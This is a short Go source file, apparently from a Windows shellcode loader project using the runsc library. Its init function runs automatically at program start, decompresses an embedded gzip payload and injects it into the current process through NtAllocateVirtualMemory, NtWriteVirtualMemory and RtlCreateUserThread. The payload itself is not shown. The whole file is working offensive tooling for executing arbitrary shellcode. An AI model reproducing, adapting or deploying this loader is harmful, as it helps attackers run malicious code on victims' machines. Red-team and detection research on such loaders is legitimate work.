//go:build windows

package main

import (
	"bytes"
	"compress/gzip"
	"io"

	"github.com/mjwhitta/runsc"
)

func init() {
	var e error
	var g *gzip.Reader
	var l *runsc.Launcher = runsc.New()

	// Return if no shellcode
	if len(sc) == 0 {
		return
	}

	// Uncompress
	if g, e = gzip.NewReader(bytes.NewReader(sc)); e != nil {
		return
	}
	defer g.Close()

	if sc, e = io.ReadAll(g); e != nil {
		return
	}

	// Launch shellcode into current process using
	// NtAllocateVirtualMemory, NtWriteVirtualMemory, and
	// RtlCreateUserThread. See github.com/mjwhitta/runsc for other
	// configuration methods.
	if e = l.Exe(sc); e != nil {
		return
	}
}
